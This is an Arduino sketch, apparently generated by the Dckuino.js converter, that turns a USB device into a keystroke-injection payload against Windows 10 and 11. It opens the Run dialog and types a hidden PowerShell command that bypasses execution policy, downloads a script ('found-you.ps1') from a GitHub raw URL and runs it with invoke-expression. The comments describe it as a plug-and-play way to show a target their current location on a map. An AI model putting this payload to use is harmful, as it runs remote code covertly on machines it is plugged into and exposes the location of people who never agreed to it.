/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  //     Title: Rage-PopUps
  //     Author: I am reza
  //     Description: This payload is meant to open a map in your targets web browser with their current location
  //     Target: Windows 10, 11
  //     --------------------------------------------------------------------------------------
  //     THIS PAYLOAD IS PLUG AND PLAY. NO MODIFICATIONS NEEDED SIMPLY RUN THE CODE DOWN BELOW.
  //     --------------------------------------------------------------------------------------
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-We-Found-You/found-you.ps1?dl=1; invoke-expression $pl");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
